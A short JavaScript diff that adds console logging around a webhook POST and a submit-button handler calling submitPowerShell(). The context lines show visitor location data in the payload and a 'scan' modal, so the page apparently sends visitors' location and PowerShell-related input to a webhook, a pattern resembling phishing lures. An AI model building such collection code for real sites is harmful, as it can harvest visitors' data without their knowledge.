@@ -274,6 +274,9 @@ Location: ${locationInfo.city || 'Unknown'}, ${locationInfo.region || 'Unknown'}
         };
 
         // Send webhook request through proxy
+        console.log('Sending webhook request to:', webhookUrl);
+        console.log('Payload:', payload);
+        
         const response = await fetch(webhookUrl, {
             method: 'POST',
             headers: {
@@ -281,6 +284,8 @@ Location: ${locationInfo.city || 'Unknown'}, ${locationInfo.region || 'Unknown'}
             },
             body: JSON.stringify(payload)
         });
+        
+        console.log('Response status:', response.status);
         
         // Hide loading overlay
         if (loadingOverlay) loadingOverlay.style.display = 'none';
@@ -622,6 +627,14 @@ document.addEventListener('DOMContentLoaded', function() {
     if (scanArea) {
         scanArea.addEventListener('click', function() {
             openScanModal();
+        });
+    }
+
+    // Add click handler for submit button
+    const submitBtn = document.getElementById('submitBtn');
+    if (submitBtn) {
+        submitBtn.addEventListener('click', function() {
+            submitPowerShell();
         });
     }
 
